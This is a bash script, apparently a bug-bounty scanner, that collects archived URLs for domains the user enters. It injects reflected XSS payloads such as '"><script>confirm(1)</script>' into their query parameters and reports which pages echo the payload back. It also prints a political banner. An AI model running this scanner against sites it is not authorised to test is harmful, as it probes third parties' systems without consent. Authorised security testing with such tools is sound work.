#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
RESET="\033[0m"
WHITE="\033[1;37m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
YELLOW="\033[1;33m"
LIGHT_BLUE="\033[1;34m"
DARK_GRAY="\033[1;30m"
BOLD="\033[1m"

xss_hunt_stylish_logo() {
    echo -e "${MAGENTA}        /\_/\     ${RESET}"
    echo -e "${MAGENTA}       ( o.o )    ${RESET}"
    echo -e "${MAGENTA}        > ^ <     ${RESET}"
    echo -e "${MAGENTA}  ███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗ ${RESET}"
    echo -e "${MAGENTA}  ██╔════╝██║  ██║██╔══██╗██╔════╝██║  ██║ ${RESET}"
    echo -e "${MAGENTA}  ███████╗███████║██████╔╝█████╗  ███████║ ${RESET}"
    echo -e "${MAGENTA}  ╚════██║██╔══██║██╔═══╝ ██╔══╝  ██╔══██║ ${RESET}"
    echo -e "${MAGENTA}  ███████║██║  ██║██║     ███████╗██║  ██║ ${RESET}"
    echo -e "${MAGENTA}  ╚══════╝╚═╝  ╚═╝╚═╝      ╚══════╝╚═╝  ╚═╝ ${RESET}"
    echo -e "${GREEN}               0xYumeko               ${RESET}"
}

xss_hunt_stylish_logo
echo -e "${LIGHT_BLUE}====================================${RESET}"
echo -e "${LIGHT_BLUE}  💻  Domain Vulnerability Scanner XSS v1.0  🛡️  ${RESET}"
echo -e "${LIGHT_BLUE}====================================${RESET}"
echo -e "${YELLOW}   🕵️‍♀️ Scan multiple domains for vulnerabilities! 🕵️‍♂️  ${RESET}"
echo -e "${YELLOW}====================================${RESET}"
echo

echo -e "${GREEN}🌟 ${BOLD}${PURPLE}Free Palestine! 🌟${RESET}"
echo -e "${CYAN}The world will continue to remember, speak up, and support. ${YELLOW}${BOLD}Solidarity forever!${RESET}"
echo
echo -e "${CYAN}Palestine’s spirit lives in the hearts of millions.${RESET}"
echo -e "${CYAN}Every day, we raise our voices for justice, dignity, and freedom.${RESET}"
echo -e "${GREEN}${BOLD}Long live Palestine! ✊${RESET}"
echo
echo -e "${YELLOW}====================================${RESET}"

echo -e "${WHITE}🔍 Please enter the domains separated by commas: ${RESET}"
read -r domains_input

if [[ -z "$domains_input" ]]; then
    echo -e "${RED}Error: No domains entered. Exiting.${RESET}"
    exit 1
fi

echo -e "${GREEN}You have entered the following domains: $domains_input${RESET}"

IFS=',' read -r -a domains <<< "$domains_input"

temp_file="temp_urls.txt"
output_file="unique_urls.txt"

echo -e "${GREEN}🚀 Starting the domain testing process...${RESET}"
echo

for domain in "${domains[@]}"; do
    domain=$(echo "$domain" | xargs)  
    echo -e "${LIGHT_BLUE}====================================${RESET}"
    echo -e "${LIGHT_BLUE}  Analyzing links for domain: ${BOLD}$domain${RESET}...${RESET}"

    echo "$domain" | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"

    echo -e "${LIGHT_BLUE}  Searching for vulnerabilities for domain: ${BOLD}$domain${RESET}...${RESET}"
    echo "$domain" | waybackurls | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' >> "$temp_file"
done

sort -u "$temp_file" > "$output_file"

echo -e "${GREEN}🔍 Checking for vulnerabilities...${RESET}"
echo
while read -r host; do 
    if curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)"; then
        echo -e "${RED}🔴 $host ${GREEN}Vulnerable!${RESET}"
    else
        echo -e "${DARK_GRAY}⚪ $host ${CYAN}Not Vulnerable.${RESET}"
    fi
done < "$output_file"


rm "$temp_file"

echo -e "${YELLOW}====================================${RESET}"
echo -e "${YELLOW}Duplicates removed and results stored in $output_file.${RESET}"
echo -e "${YELLOW}====================================${RESET}"
